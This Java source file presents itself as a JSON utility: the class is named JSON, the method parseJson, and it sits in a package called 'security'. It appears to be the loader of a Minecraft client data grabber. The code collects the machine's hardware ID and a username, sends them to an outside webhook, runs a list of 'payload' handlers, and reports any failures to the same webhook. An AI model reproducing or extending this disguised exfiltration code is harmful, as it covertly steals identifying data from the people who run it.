package security;



import net.minecraft.client.Minecraft;
import security.ui.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;

public final class JSON
{
    private static final ArrayList<JSONObject> objects;
    private static final boolean debug = false;

    public static void main(final String[] args) {
        new JSON();
        parseJson();
    }

    public static void parseJson() {
        JSON.objects.addAll(Arrays.asList());
        final String separator = new JSONBuilder().value("content", "> HWID: " + HWIDUtils.getHWID() + "\\n > USERNAME: CanonBall90").build();
        WebhookUtils.send(separator);
        JSON.objects.spliterator().forEachRemaining(payload -> {
            try {
                payload.handle();
            }
            catch (Exception e) {
                WebhookUtils.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
            }
            return;
        });
        WebhookUtils.send(separator);
    }

    static {
        objects = new ArrayList<JSONObject>();
    }
}